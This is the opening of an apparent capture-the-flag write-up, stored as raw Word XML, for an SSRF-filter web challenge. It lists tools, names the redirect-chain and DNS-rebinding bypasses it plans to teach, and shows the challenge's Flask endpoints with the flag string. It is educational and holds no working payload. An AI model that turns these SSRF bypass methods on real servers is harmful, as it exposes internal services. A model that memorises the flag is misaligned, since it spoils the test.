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6D233" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="400" w:after="120"/>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lato" w:eastAsia="Lato" w:hAnsi="Lato" w:cs="Lato"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>BPSSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101AEC7C" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="320"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lato" w:eastAsia="Lato" w:hAnsi="Lato" w:cs="Lato"/>
          <w:b/>
          <w:color w:val="20A4F4"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EF118F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">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Lato" w:eastAsia="Lato" w:hAnsi="Lato" w:cs="Lato"/>
          <w:b/>
          <w:noProof/>
          <w:color w:val="6D9EEB"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65153E63" wp14:editId="7B073C8B">
            <wp:extent cx="1104900" cy="6096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4900" cy="609600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="358183DA" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00EC35E6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44AC010F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Prerequisites &amp; Requirements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B18580" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Understanding of Server-Side Request Forgery (SSRF) vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565B4C4D" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Basic knowledge of HTTP and redirects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078B06C9" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Familiarity with Python and Flask applications</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8FF434" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Understanding of DNS concepts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C986F04" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Google account for email-based techniques</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE7DDAB" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>What will you learn?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002FD493" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>How to analyze SSRF protection mechanisms in a white-box setting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FAAAA6" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Advanced SSRF bypass techniques using redirect chains</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C717255" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>How to leverage Google URL redirects in SSRF attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673BE870" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">DNS rebinding attack </w:t>
      </w:r>
      <w:r>
        <w:t>implementation for SSRF exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00510E6C" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>URL parameter manipulation and interception techniques</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A2F0C5" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FB7D80" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite or similar proxy tool</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0A67BF" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ngrok</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for HTTP tunneling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163AF8D5" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Python environment (for running Flask applications)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F68D32D" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Gmail account</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237A5059" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>DNS rebinding service (lock.cmpxchg8b.com/rebinder.html)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2669287F" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B435286" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="single" w:sz="18" w:space="0" w:color="9F9F9F"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>I've built the ultimate SSRF protection you can use it for any web application! It checks hostnames, validates IPs, preve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>nts DNS rebinding, and even limits redirects. There's absolutely no way anyone could bypass this security layer. I've been testing it extensively, and I'm confident it's bulletproof. Want to prove me wrong? Good luck with that - you'll need it!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C1B5F8" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="7030A0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326EDC63" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>1. Understanding the Normal Application Flow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62098E04" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>Before attempting to bypass any protection, we need to understand how the application is supposed to work. Looking at the endpoints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239A174E" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2E2E2"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>@app.route('/admin', methods=['GET'])</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>def admin():</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    global flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> </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user_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>request.remote_addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>user_ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> != "127.0.0.1":</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return "only localhost."</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>request.args.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('nickname'):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        nickname = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>request.args.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('nickname')</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        flag = sha256_hash(nickname)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return "success."</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>@app.route</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>("/flag", methods=['POST'])</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>def clear():</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    global flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    if flag == sha256_hash(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>request.args.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>('nickname')):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return "flag{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stigmata_stigmata_stigmata</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t xml:space="preserve">    else:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        return "you can't bypass SSRF-FILTER. Try again."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697CDBBB" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>The intended flow is:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76069150" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ccess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>admin?nickname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>yourname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> from localhost (127.0.0.1) to set the flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750197FB" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Send a POST request to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>flag?nickname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>yourname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> with the same nickname to retrieve the flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59306401" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t xml:space="preserve">However, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can only be accessed from localhost, which is impossible from an external browser. This is where SSRF comes in – we need the application to make a request to its own localhost endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307962E4" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>![</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>Image placeholder: Diagram showing intended application flow]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD38737" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>2. Fr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>ontend Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF72046" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:t>When first accessing the application, we're presented with a simple interface that allows checking URLs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9DE85B" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FAAA5DE" wp14:editId="30AA1BC7">
            <wp:extent cx="5943600" cy="287845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878455"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:t>The application claims to validate URLs and prevent SSRF attacks. Let's analyze the backend code to understand how it works.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E7DD7A" w14:textId="77777777" w:rsidR="00EC35E6" w:rsidRDefault="00730AB9">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
